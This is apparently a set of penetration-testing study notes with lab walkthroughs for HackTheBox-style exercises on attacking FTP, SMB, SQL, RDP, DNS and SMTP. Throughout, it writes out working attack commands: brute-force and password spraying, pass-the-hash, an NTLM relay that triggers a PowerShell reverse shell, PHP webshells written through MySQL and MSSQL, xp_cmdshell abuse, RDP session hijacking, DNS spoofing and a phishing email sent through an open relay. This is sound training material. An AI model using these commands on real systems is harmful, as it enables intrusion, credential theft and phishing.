# Attacking Common Services

1. [Protocol Specific Attacks](#protocol-specific-attacks)
1. [FTP](#ftp)
1. [SMB](#smb)
1. [SQL Databases](#sql-databases)
1. [RDP](#rdp)
1. [DNS](#dns)
1. [SMTP](#smtp)
1. [Skills Assessment](#skills-assessment)

## Protocol Specific Attacks

* Service misconfigurations:

  * Authentication - weak creds, anonymous authentication, misconfigured access rights
  * Unnecessary defaults - unnecessary features, error messages, disabled security features

## FTP

* Attacking FTP:

  ```sh
  # enumeration with nmap
  nmap -sC -sV -p 21 192.168.2.142

  # check anonymous login

  # bruteforcing attack using medusa
  medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp

  # ftp bounce attack
  # uses FTP servers to deliver outbound traffic to another device in network
  nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
  # here, we are using FTP server 10.10.110.213
  # to scan internal server 172.17.0.2 using ftp bounce attack
  ```

## SMB

* Interacting with SMB in Windows:

  ```cmd
  dir \\192.168.220.129\Finance\
  # interact with share

  # connect or disconnect using 'net use'
  net use n: \\192.168.220.129\Finance
  # here, we are connecting to file share and mapping its contents to n:

  net use n: \\192.168.220.129\Finance /user:plaintext Password123
  # using creds to authenticate

  # find number of files in shared folder recursively
  dir n: /a-d /s /b | find /c ":\"
  # /a-d, where /a is attribute and -d means no directories
  # /s for recursive and /b for bare format

  dir n:\*cred* /s /b
  # search for 'cred' keyword recursively in file or folder name
  # we can search for other terms like password, user, secret, key, or code file extensions as well

  findstr /s /i cred n:\*.*
  # to find specific word within text file
  ```

  ```ps
  # uses cmdlets or their shortform
  Get-ChildItem \\192.168.220.129\Finance\
  # we can use 'gci' as well

  # to connect to shared folder
  New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem"

  # to provide creds, we need to create a PSCredential object
  $username = 'plaintext'
  
  $password = 'Password123'

  $secpassword = ConvertTo-SecureString $password -AsPlainText -Force

  $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword

  # connect with cred now
  New-PSDrive -Name "N" -Root "\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred

  N:
  # navigate to shared folder

  # get total count of files
  (Get-ChildItem -File -Recurse | Measure-Object).Count

  # find specific files
  Get-ChildItem -Recurse -Path N:\ -Include *cred* -File

  # search keyword in file contents
  Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
  ```

* Interacting with SMB in Linux:

  ```sh
  # mounting SMB shares
  sudo mkdir /mnt/Finance

  sudo apt install cifs-utils

  sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance

  sudo mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credential=/path/credsfile
  # we can also use a file for creds
  # it has to be in format of 'key=value', newline-separated

  # to find filenames
  find /mnt/Finance/ -name *cred*

  # find files containing string
  grep -rn /mnt/Finance/ -ie cred
  ```

* Attacking SMB:

  ```sh
  # enumeration
  nmap 10.129.14.128 -sV -sC -p139,445

  # check for null session and list the shares
  smbclient -N -L //10.129.14.128

  # we can also use smbmap
  smbmap -H 10.129.14.128

  # check share 'notes'
  smbmap -H 10.129.14.128 -r notes

  # if we have read & write permissions, we can upload and download to share

  smbmap -H 10.129.14.128 --download "notes\note.txt"

  smbmap -H 10.129.14.128 --upload "notes\test.txt"
  ```

  ```sh
  # with a null session, we can use rpcclient for enumeration
  rpcclient -U'%' 10.10.110.17

  enumdomusers
  # we can use other functions as well

  # enum4linux can also be used to check
  ./enum4linux-ng.py 10.10.11.45 -A -C

  # password spraying
  crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
  ```

* RCE from SMB:

  ```sh
  impacket-psexec administrator:'Password123!'@10.10.110.17

  crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
  # -x to run CMD commands
  # and -X to run PS commands

  crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
  # enumerate logged-on users

  # if we have admin privileges, we can extract hashes
  crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam

  # for PtH attacks
  crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
  ```

* Capturing hashes using Responder:

  ```sh
  # we can capture hashes using Responder as well
  sudo responder -I tun0
  # this creates a fake SMB server

  # user tries to access a share that does not exist
  # and responder captures the hashes, which can be cracked

  # if we cannot crack the hash, we can relay it
  # using tools like impacket-ntlmrelayx or MultiRelay.py

  sudo vim /etc/responder/Responder.conf
  # set SMB to 'Off'

  # impacket-ntlmrelayx can be used to dump SAM database
  impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

  # setup a listener
  nc -nvlp 9001

  # then we can use a PS reverse-shell from revshells
  # once victim authenticates to this server, we get a reverse shell
  impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 string>'
  ```

## SQL Databases

* Interacting with common SQL databases in Linux:

  ```sh
  # to interact with MSSQL
  sqsh -S 10.129.20.13 -U username -P password123
  # we can use sqlcmd in Windows

  # to interact with MySQL
  mysql -u username -pPassword123 -h 10.129.20.13

  # for GUI apps for database engines
  # we can use tools like dbeaver
  ```

* Attacking SQL DBs:

  ```sh
  # enumeration
  nmap -Pn -sV -sC -p1433 10.10.10.125
  # we can also check ports 3306 and 2433

  # connecting to MySQL server in Linux
  mysql -u julio -pPassword123 -h 10.129.20.13

  # connecting to MySQL server in Windows
  sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30

  # connecting to MSSQL server in Linux
  sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h

  # we can also use mssqlclient.py
  mssqlclient.py -p 1433 julio@10.129.203.7 

  # MSSQL has 2 authentication modes
  # Windows authentication mode and mixed mode

  # if Windows Authentication mode is being used - for mssqlsvc account, for example
  # then we need to specify domain name or hostname of target
  # for mssqlclient, we can use the '-windows-auth' switch

  sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
  # in this case, we are targeting a local account
  ```

* Interacting with MySQL:

  ```sh
  mysql -u julio -pPassword123 -h 10.129.20.13

  SHOW DATABASES;

  USE htbusers;

  SHOW TABLES;

  SELECT * FROM users;
  ```

* Interacting with MSSQL:

  ```sh
  # in Windows using sqlcmd
  sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30

  # we need to use 'GO' after query to execute
  SELECT name FROM master.dbo.sysdatabases
  GO

  USE htbusers
  GO

  SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
  GO

  SELECT * FROM users
  GO
  ```

* RCE from MSSQL:

  ```sh
  # if 'xp_cmdshell' is enabled, we can get command execution
  xp_cmdshell 'whoami'
  GO

  # if 'xp_cmdshell' is not enabled and we have the required privileges, we can enable it
  EXECUTE sp_configure 'show advanced options', 1
  GO
  RECONFIGURE
  GO
  EXECUTE sp_configure 'xp_cmdshell', 1
  GO
  RECONFIGURE
  GO
  ```

  ```sh
  # write to local files in MSSQL

  # first enable 'Ole Automation Procedures'

  sp_configure 'show advanced options', 1
  GO
  RECONFIGURE
  GO
  sp_configure 'Ole Automation Procedures', 1
  GO
  RECONFIGURE
  GO

  # then we can create a file

  DECLARE @OLE INT
  DECLARE @FileID INT
  EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
  EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
  EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
  EXECUTE sp_OADestroy @FileID
  EXECUTE sp_OADestroy @OLE
  GO

  # to read a local file
  SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
  GO
  ```

* RCE from MySQL:

  ```sh
  # if we have a PHP webserver, we can write a local webshell
  SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
  # this needs the 'secure_file_priv' setting to be misconfigured

  # read local files
  select LOAD_FILE("/etc/passwd");
  ```

* Capturing MSSQL service hash:

  ```sh
  # start responder in attacker
  sudo responder -I tun0

  # alternatively, we can also use impacket-smbserver
  sudo impacket-smbserver share ./ -smb2support

  # on victim Windows machine
  EXEC master..xp_dirtree '\\10.10.110.17\share\'
  GO

  EXEC master..xp_subdirs '\\10.10.110.17\share\'
  GO

  # we get the hashes on attacker now
  # NetNTLMv2 hashes can be cracked using -m 5600 on Hashcat
  ```

* Impersonate users in MSSQL:

  ```sh
  # move to master DB since all users have access to this DB
  USE master
  GO

  # first, identify users that can be impersonated
  SELECT distinct b.name
  FROM sys.server_permissions a
  INNER JOIN sys.server_principals b
  ON a.grantor_principal_id = b.principal_id
  WHERE a.permission_name = 'IMPERSONATE'
  GO

  # verify if we have sysadmin role
  SELECT SYSTEM_USER
  SELECT IS_SRVROLEMEMBER('sysadmin')
  GO

  # even if we are not sysadmin, we can impersonate one of the users from earlier command
  # suppose we can impersonate 'sa'
  EXECUTE AS LOGIN = 'sa'
  SELECT SYSTEM_USER
  SELECT IS_SRVROLEMEMBER('sysadmin')
  GO
  ```

* Communicate with other DBs in MSSQL:

  ```sh
  # identify linked servers
  SELECT srvname, isremote FROM sysservers
  GO

  # 1 indicates remote server
  # and 0 indicates linked server

  # we can pass commands to linked server
  EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
  GO
  ```

## RDP

* Attacking RDP:

  ```sh
  # enumeration
  nmap -Pn -p3389 192.168.2.143

  # password spraying using crowbar
  crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'

  # password spraying using hydra
  hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp

  # once we have the right creds, we can use tools like rdesktop or xfreerdp to login
  rdesktop -u admin -p password123 192.168.2.143
  ```

* RDP session hijacking:

  ```cmd
  # after getting access as a user with admin privileges
  query user

  # we can check if any other users are logged in as RDP
  # and can takeover their sessions

  # we can use tscon.exe and our SYSTEM privileges
  tscon 4 /dest:rdp-tcp#13
  # where 4 is the victim session ID
  # and rdp-tcp#13 is our current session name

  # we can also create a Windows service that does the same
  sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

  net start sessionhijack
  # after this, we get a new terminal with the victim user session
  ```

* RDP PtH:

  ```sh
  # this needs 'Restricted Admin Mode' setting to be enabled on target
  # adding the registry key first
  reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

  # then we can do PtH using xfreerdp
  xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
  ```

## DNS

* Attacking DNS:

  ```sh
  # enumeration
  nmap -p53 -Pn -sV -sC 10.10.110.213

  # DNS zone transfer
  dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
  # check for domain names

  # we can also use tools like fierce to enumerate
  fierce --domain zonetransfer.me

  # subdomain enumeration
  ./subfinder -d inlanefreight.com -v

  # as an alternative, we can use subbrute
  git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
  cd subbrute
  echo "ns1.inlanefreight.com" > ./resolvers.txt
  ./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt
  # we can use custom name servers here

  # from the subdomains found, we can enumerate further
  # using nslookup or host
  host support.inlanefreight.com
  # this can give us more subdomains

  # if there are any unused subdomains, we can perform a subdomain takeover as well
  ```

* DNS spoofing (DNS cache poisoning):

  ```sh
  # for local DNS cache poisoning
  # we can use MITM tools like ettercap or bettercap

  # edit the tool DNS file to map the target domain name to be spoofed
  # and attacker IP to be redirected to
  sudo vim /etc/ettercap/etter.dns
  # in this example, we can add records like
  # inlanefreight.com      A   192.168.225.110
  # *.inlanefreight.com    A   192.168.225.110

  # start ettercap tool and scan for live hosts
  ettercap
  # Hosts > Scan for Hosts
  # after scan, add target IP to Target1 and default gateway to Target2

  # navigate to Plugins > Manage Plugins and activate 'dns_spoof'
  # this sends target fake DNS responses for spoofing

  # web browser or ping from target should lead to attacker IP now
  ```

## SMTP

* Attacking email servers:

  ```sh
  # checking MX DNS records to identify mail server
  host -t MX example.com

  dig mx inlanefreight.com | grep "MX" | grep -v ";"

  # get mail server IP
  host -t A mail1.inlanefreight.htb
  
  # identify if target is using cloud service mail server or custom one
  
  # in case of custom mail server, we can enumerate common ports further
  nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
  ```

* Checking misconfigurations:

  ```sh
  # we can check if an username is valid

  # connect to SMTP server
  telnet 10.10.110.20 25

  VRFY root
  # check if user exists

  VRFY testuser
  # we will get 'unknown' error if user does not exist

  # we can also check with EXPN
  # used for distribution list too

  EXPN john

  EXPN support-team
  # can give multiple users if DL exists

  # we can also use RCPT TO
  # for checking if recipient exists or not

  MAIL FROM:test@htb.com
  test content

  RCPT TO:john
  # if we do not get 'unknown' error
  # that means user exists

  # we can also check with USER command
  # if server uses POP3

  USER testuser
  # -ERR if user does not exist

  USER john
  # +OK if user exists
  ```

  ```sh
  # we can also use tools like smtp-user-enum

  smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
  # -M to specify mode
  # -D for domain, depends on implementation
  ```

* Cloud enumeration:

  ```sh
  # for Office 365, we can use o365spray tool

  # validate if target is using O365
  python3 o365spray.py --validate --domain msplaintext.xyz

  # enumerate usernames
  python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
  ```

* Password attacks:

  ```sh
  # password spray
  hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3

  # for cloud services like O365
  python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
  ```

* Open relay attack:

  ```sh
  # check if SMTP port allows open relay
  nmap -p25 -Pn --script smtp-open-relay 10.10.11.213

  # use a mail client to connect to the mail server and send a phishing email
  swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
  ```

## Skills Assessment

* Attacking Common Services - Easy:

  * ```nmap``` scan for given mail server - ```nmap -T4 -p- -A -Pn -v 10.129.203.7```:

    * 21/tcp - ftp
    * 25/tcp - smtp - hMailServer smtpd
    * 80/tcp - http - Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
    * 443/tcp - ssl/https - Core FTP HTTPS Server
    * 587/tcp - smtp - hMailServer smtpd
    * 3306/tcp - mysql - MySQL 5.5.5-10.4.24-MariaDB
    * 3389/tcp - ms-wbt-server
  
  * Enumerating FTP:

    ```sh
    ftp 10.129.203.7
    # anonymous mode not working

    # we have a FTP HTTPS server
    # this uses basic HTTP authentication
    # anonymous mode does not work here too
    ```
  
  * Enumerating SMTP - we have been given the domain 'inlanefreight.htb':

    ```sh
    smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.203.7

    # I needed to run this command twice for some reason
    # it did not work with the first victim box for some reason
    ```
  
  * From ```smtp-user-enum```, we get the user <fiona@inlanefreight.htb> - we can use this further while bruteforcing
  
  * The webpage on port 80 is the default webpage for XAMPP - no info found here

  * Enumerating MySQL:

    ```sh
    mysql -u root -h 10.129.203.7 -p
    # trying blank password or common passwords does not help

    mysql -u admin -h 10.129.203.7 -p
    # other common usernames also do not work
    ```
  
  * Bruteforcing services:

    ```sh
    # using the given wordlists in resources

    # bruteforce SMTP first as it is a mail server
    hydra -l fiona@inlanefreight.htb -P pws.list smtp://10.129.203.7
    # we can use multiple threads but this target did not respond well to it

    # bruteforce FTP
    hydra -l fiona@inlanefreight.htb -P pws.list ftp://10.129.203.7 -t 36

    # we can check with other wordlists like rockyou.txt
    # but we will check with the given small wordlist first

    # bruteforce mysql
    hydra -l fiona@inlanefreight.htb -P pws.list mysql 10.129.203.7 -t 36
    # we get blocked midway due to many connection errors

    # bruteforce RDP
    hydra -l fiona@inlanefreight.htb -P pws.list rdp 10.129.203.7

    # bruteforce SMTP with rockyou.txt
    hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt smtp://10.129.203.7
    # this gives us the password '987654321'
    ```
  
  * We can log into SMTP now:

    ```sh
    telnet 10.129.203.7 25

    HELO inlanefreight.htb

    AUTH LOGIN

    # submit base64-encoded username and password when prompted

    HELP
    # we do not have much capabilities here
    ```
  
  * We can check for cred reuse:

    ```sh
    xfreerdp /u:fiona /p:987654321 /v:10.129.203.7 /d:inlanefreight.htb
    # does not work

    mysql -u fiona -h 10.129.203.7 -p
    # the same password works for MySQL however
    ```
  
  * Enumerating MariaDB:

    ```sh
    show databases;
    # we have 5 DBs, we can check each of them

    use test;

    show tables;
    # empty set

    use phpmyadmin;

    show tables;
    # check all tables

    # check other databases too
    ```
  
  * We do not have any creds left in any of the tables in MySQL. However, we can try to get RCE from here

  * From the webserver, the PHPinfo page shows that the configuration file is located at ```C:\xampp\php\php.ini``` - we can try to [write a webshell accordingly](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#mysql-commands):

    ```sh
    SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:/xampp/htdocs/shell.php';
    ```
  
  * We can check if the shell works:

    ```sh
    # in attacker machine
    curl http://10.129.203.7/shell.php?c=whoami
    # nt authority\system

    curl http://10.129.203.7/shell.php?c=dir

    curl http://10.129.203.7/shell.php?c=dir%20C:%5C
    # url encoded command for 'dir C:\'

    # the flag can be found in Administrator Desktop
    ```

* Attacking Common Services - Medium:

  * ```nmap``` scan - ```nmap -T4 -p- -A -Pn -v 10.129.201.127```:

    * 22/tcp - ssh - OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
    * 53/tcp - domain - ISC BIND 9.16.1 (Ubuntu Linux)
    * 110/tcp - pop3 - Dovecot pop3d
    * 995/tcp - ssl/pop3 - Dovecot pop3d
    * 2121/tcp - ftp
    * 30021/tcp - ftp
  
  * Enumerating DNS:

    ```sh
    # we can use the subbrute tool
    cd subbrute

    echo "10.129.201.127" > ./resolvers.txt

    ./subbrute.py inlanefreight.com -s ./names.txt -r ./resolvers.txt
    # this does not work as intended since target server is not a nameserver
    ```
  
  * Enumerating FTP on both ports:

    ```sh
    ftp 10.129.201.127 2121
    # anonymous mode does not work

    ftp 10.129.201.127 30021
    # anonymous mode works here

    ls -la
    # we have a directory named 'simon', this could be a user

    cd simon

    ls -la
    # a file is there

    get mynotes.txt

    exit
    ```
  
  * The 'mynotes.txt' file contains strings - this could be a password list to be used for bruteforcing

  * Bruteforcing POP3:

    ```sh
    hydra -l simon -P mynotes.txt 10.129.201.127 pop3
    # this works and we get a password "8Ns8j1b!23hs4921smHzwn"
    ```
  
  * We can enumerate the POP3 service now:

    ```sh
    telnet 10.129.201.127 110

    CAPA
    # capabilities

    USER simon

    PASS 8Ns8j1b!23hs4921smHzwn
    # we are logged in now

    LIST
    # we have 1 message

    RETR 1
    # we get the email which contains the OpenSSH private key
    ```
  
  * From the above email, we can copy and paste the private key for Simon - the issue is that it's all in a single line and not the right format.

  * OpenSSH private keys should have 70 chars per line; we can attempt to [convert this to its original format](https://stackoverflow.com/questions/56333989/convert-single-line-rsa-private-ssh-key-to-multi-line):

    ```sh
    vim simon_id_rsa
    # paste the single-line key from email

    sed -i -e "s/-----BEGIN OPENSSH PRIVATE KEY-----/&\n/" -e "s/-----END OPENSSH PRIVATE KEY-----/\n&/" -e "s/\S\{70\}/&\n/g" simon_id_rsa

    cat simon_id_rsa
    # now it seems to be in the correct format

    chmod 600 simon_id_rsa

    ssh simon@10.129.201.127 -i simon_id_rsa
    
    cat flag.txt
    ```

* Attacking Common Services - Hard:

  * ```nmap``` scan - ```nmap -T4 -p- -A -Pn -v 10.129.203.10```:

    * 135/tcp - msrpc - Microsoft Windows RPC
    * 445/tcp - microsoft-ds
    * 3389/tcp - ms-wbt-server
  
  * Enumerating SMB:

    ```sh
    smbmap -H 10.129.203.10
    # authentication error

    rpcclient -U'%' 10.129.203.10

    enum4linux 10.129.203.10
    ```

  * We have been given usernames 'simon' and 'fiona'; as we had a user 'simon' in the previous task as well, we can attempt cred re-use before going for bruteforce:

    ```sh
    # using the password "8Ns8j1b!23hs4921smHzwn" found in previous task
    
    smbclient -L \\\\10.129.203.10 -U simon
    # this lists the shares

    # we have a share 'Home'
    smbclient \\\\10.129.203.10\\home -U simon

    # this works

    dir
    # multiple folders

    recurse
    # enable recursive mode

    ls
    # now we can see all files

    cd IT\Fiona
    # we have creds.txt

    mget *

    cd ..\John
    # we have information.txt, notes.txt and secrets.txt

    cd ..\Simon
    # we have random.txt here

    mget *

    exit
    ```
  
  * We can check all the files fetched from SMB:

    * creds.txt - includes list of passwords as 'Windows Creds'
    * information.txt - this mentions a database, local linked server and impersonation
    * notes.txt - nothing useful
    * random.txt - another list of creds
    * secrets.txt - password list that seems to be used for DB
  
  * We have 3 users and 3 wordlists; we can start bruteforcing services now:

    ```sh
    # bruteforce RDP
    # checking for 'fiona'
    hydra -l fiona -P creds.txt 10.129.203.10 rdp
    # this gives us the password '48Ns72!bns74@S84NNNSl'
    ```
  
  * We can now RDP into the machine as 'fiona':

    ```sh
    xfreerdp /u:fiona /p:'48Ns72!bns74@S84NNNSl' /v:10.129.203.10
    ```
  
  * Since the note found from John's folder mentioned a database, we can check for DB related utilities on target:

    ```sh
    # in RDP session, open command prompt

    # sqsh or mysql does not exist on box
    # we have sqlcmd here, so MSSQL could be used

    # this can be further confirmed when we check internal ports
    netstat -ano
    # shows 1433/TCP is listening

    # also, in C drive we have a folder named SQL2019

    # trying to log into sqlcmd with the same creds does not work
    # as we are not aware of the server name as well

    # simply using the utility itself works in this case

    sqlcmd
    SELECT name FROM master.dbo.sysdatabases
    go

    # this gives us two non-default DBs - we can check them

    USE TestingDB
    go

    SELECT table_name FROM TestingDB.INFORMATION_SCHEMA.TABLES
    go
    # no tables in this DB

    USE TestAppDB
    go
    # we are not able to access this DB as 'fiona'

    # check if we are able to impersonate anyone
    USE master
    go

    # first, identify users that can be impersonated
    SELECT distinct b.name
    FROM sys.server_permissions a
    INNER JOIN sys.server_principals b
    ON a.grantor_principal_id = b.principal_id
    WHERE a.permission_name = 'IMPERSONATE'
    go
    # this shows we can impersonate 'john' and 'simon'

    # verify if we have sysadmin role
    SELECT SYSTEM_USER
    SELECT IS_SRVROLEMEMBER('sysadmin')
    go
    # this shows 0 - we are not sysadmin

    # still, we can impersonate one of the users from earlier command
    EXECUTE AS LOGIN = 'john'
    SELECT SYSTEM_USER
    SELECT IS_SRVROLEMEMBER('sysadmin')
    GO

    # 'john' is not sysadmin, but we can still impersonate him

    # we can try the above for 'simon' as well, but we get an error

    # as the note had mentioned linked servers as well, we can check that

    SELECT srvname, isremote FROM sysservers
    go

    # this shows WINSRV02\SQLEXPRESS is remote server (this server) - 1
    # and LOCAL.TEST.LINKED.SRV is linked server - 0

    # identify 'john' privileges on the linked server
    # by passing commands
    EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
    go
    # here we are using two single quotes, one is for escaping the other one as per syntax

    # from the output, we get user 'testadmin', who is sysadmin as shown by '1'

    # as we can remotely execute commands
    # we can read the flag from Administrator desktop

    # refer command for reading local files in MSSQL
    # again, using single quotes twice for escaping
    EXECUTE('select * FROM OPENROWSET(BULK N''C:/Users/Administrator/Desktop/flag.txt'', SINGLE_CLOB) As Contents') AT [LOCAL.TEST.LINKED.SRV]
    go
    ```
